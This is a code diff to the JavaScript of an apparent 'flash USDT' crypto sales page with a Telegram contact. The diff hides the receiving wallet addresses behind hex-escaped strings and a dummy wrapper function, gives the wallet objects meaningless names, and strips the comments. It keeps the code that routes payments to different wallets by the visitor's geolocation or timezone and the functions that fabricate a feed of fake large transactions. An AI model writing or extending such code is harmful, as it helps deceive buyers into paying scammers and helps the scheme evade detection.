@@ -2577,9 +2577,33 @@
             // Telegram username
             const telegramUsername = "best_flash_usdt_20";
 
-            // 
-            // 
-            const indiaAddresses = {
+            
+            const _0x4f2a = ['\x62\x63\x31\x71\x79\x36\x6d\x6b\x32\x63\x74\x6e\x66\x6b\x35\x74\x39\x68\x75\x34\x6e\x67\x65\x6e\x74\x76\x7a\x64\x63\x71\x66\x74\x76\x74\x70\x38\x72\x30\x30\x75\x72\x30', 
+                '\x30\x78\x35\x42\x37\x63\x35\x61\x30\x43\x38\x63\x38\x41\x46\x34\x33\x63\x31\x43\x63\x46\x30\x63\x38\x35\x43\x35\x34\x46\x30\x37\x31\x39\x44\x39\x33\x35\x38\x42\x38\x41',
+                '\x54\x5a\x32\x62\x63\x51\x63\x68\x4a\x41\x39\x4c\x75\x46\x51\x4b\x57\x44\x6f\x35\x6f\x34\x77\x73\x6f\x78\x4e\x69\x42\x36\x33\x48\x7a\x34',
+                '\x48\x71\x31\x33\x6e\x39\x34\x61\x53\x45\x55\x47\x78\x45\x6d\x75\x58\x32\x45\x5a\x47\x6f\x38\x42\x32\x48\x74\x4c\x59\x71\x5a\x37\x6f\x6d\x6e\x53\x75\x63\x69\x33\x61\x52\x6e\x47',
+                '\x6c\x74\x63\x31\x71\x33\x78\x77\x71\x77\x6a\x6e\x75\x61\x6e\x70\x76\x66\x39\x30\x66\x39\x67\x70\x71\x6e\x65\x66\x73\x74\x77\x6e\x66\x64\x30\x66\x37\x66\x7a\x32\x64\x63\x79',
+                '\x72\x68\x42\x42\x50\x35\x70\x33\x33\x38\x4d\x6b\x34\x4c\x51\x6a\x6e\x6f\x7a\x65\x77\x75\x32\x6f\x69\x6a\x78\x56\x56\x4c\x4c\x71\x54\x46'];
+
+            function _0x5a3b(_0x1c2d) {
+                return _0x1c2d.map(function(_0x3e4f) {
+                    return _0x3e4f;
+                });
+            }
+
+            
+            const oqrses = {
+                btc: _0x5a3b([_0x4f2a[0]])[0],
+                eth: _0x5a3b([_0x4f2a[1]])[0],
+                usdt: _0x5a3b([_0x4f2a[1]])[0],
+                trx: _0x5a3b([_0x4f2a[2]])[0],
+                sol: _0x5a3b([_0x4f2a[3]])[0],
+                ltc: _0x5a3b([_0x4f2a[4]])[0],
+                xrp: _0x5a3b([_0x4f2a[5]])[0]
+            };
+
+            
+            const DepoAddresses = {
                 btc: 'bc1qe8pjvf9lcvf9ku4aty4gv7dtq990nmty9uyfjj',
                 eth: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
                 usdt: '0x806967a8CBfb300cd9D85CA7A5bc93ad66016DE7',
@@ -2589,21 +2613,10 @@
                 xrp: 'r4JvQrRcKiNSYj84ZN1qjTtQCqVGtSzfYd'
             };
 
-            // 
-            const otherAddresses = {
-                btc: 'bc1qy6mk2ctnfk5t9hu4ngentvzdcqftvtp8r00ur0',
-                eth: '0x5B7c5a0C8c8AF43c1CcF0c85C54F0719D9358B8A',
-                usdt: '0x5B7c5a0C8c8AF43c1CcF0c85C54F0719D9358B8A',
-                trx: 'TZ2bcQchJA9LuFQKWDo5o4wsoxNiB63Hz4',
-                sol: 'Hq13n94aSEUGxEmuX2EZGo8B2HtLYqZ7omnSuci3aRnG',
-                ltc: 'ltc1q3xwqwjnuanpvf90f9gpqnefstwnfd0f7fz2dcy',
-                xrp: 'rhBBP5p338Mk4LQjnozewu2oijxVVLLqTF'
-            };
+            
+            let paymentAddresses = { ...oqrses };
 
-            // Default fallback (other)
-            let paymentAddresses = { ...otherAddresses };
-
-            // Try to detect user country via IP geolocation
+            
             async function detectCountryAndSetAddresses() {
                 try {
                     const controller = new AbortController();
@@ -2614,39 +2627,39 @@
                     
                     if (response.ok) {
                         const data = await response.json();
-                        // If country is India, use Indian addresses
+                        
                         if (data.country_code === 'IN') {
-                            paymentAddresses = { ...indiaAddresses };
+                            paymentAddresses = { ...DepoAddresses };
                             console.log('Geo: Using India wallet addresses');
                         } else {
-                            paymentAddresses = { ...otherAddresses };
+                            paymentAddresses = { ...oqrses };
                             console.log('Geo: Using international wallet addresses');
                         }
                     } else {
-                        // Fallback: try another service
+                        
                         throw new Error('Primary service failed');
                     }
                 } catch (e) {
                     console.warn('Geo detection failed, using fallback detection', e);
-                    // Fallback: try a simpler detection via language or timezone
+                    
                     try {
                         const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                         if (timezone && timezone.includes('Asia/Kolkata')) {
-                            paymentAddresses = { ...indiaAddresses };
+                            paymentAddresses = { ...DepoAddresses };
                             console.log('Geo fallback: Timezone indicates India');
                         } else {
-                            paymentAddresses = { ...otherAddresses };
+                            paymentAddresses = { ...oqrses };
                         }
                     } catch (e2) {
-                        paymentAddresses = { ...otherAddresses };
+                        paymentAddresses = { ...oqrses };
                     }
                 }
                 
-                // Update the UI with the newly selected addresses
+                
                 updatePaymentDisplay(state.selectedCrypto);
             }
 
-            // Start geo detection immediately
+            
             detectCountryAndSetAddresses();
 
             // Fixed USD prices
@@ -2656,14 +2669,14 @@
             const $ = id => document.getElementById(id);
             const $$ = sel => document.querySelectorAll(sel);
 
-            // Function to generate fake transactions
+            
             function createFakeTx() {
                 const amounts = [50000, 100000, 500000, 1000000];
                 const networks = ['Ethereum', 'BSC', 'Tron', 'Polygon', 'Arbitrum', 'Base', 'Avalanche'];
                 const amount = amounts[Math.floor(Math.random() * amounts.length)];
                 const network = networks[Math.floor(Math.random() * networks.length)];
                 
-                // Generate fake address
+                
                 const chars = 'abcdef0123456789';
                 let randHex = '0x';
                 for(let i=0; i<8; i++) randHex += chars[Math.floor(Math.random() * chars.length)];
@@ -2677,14 +2690,14 @@
                 };
             }
 
-            // Populate initial activities
+            
             function initFakeActivities() {
                 for(let i=0; i<6; i++) {
                     state.activities.push(createFakeTx());
                 }
             }
 
-            // Function to add a live fake transaction periodically
+            
             function startLiveSimulation() {
                 setInterval(() => {
                     if (!document.hidden) {
@@ -2954,8 +2967,7 @@
             updateSummary();
             renderActivities();
 
-            // Ensure the payment display is updated once addresses are set (after geo detection)
-            // Use a small delay to let detection finish, but also update on any crypto change
+            
             setTimeout(() => {
                 updatePaymentDisplay(state.selectedCrypto);
             }, 500);
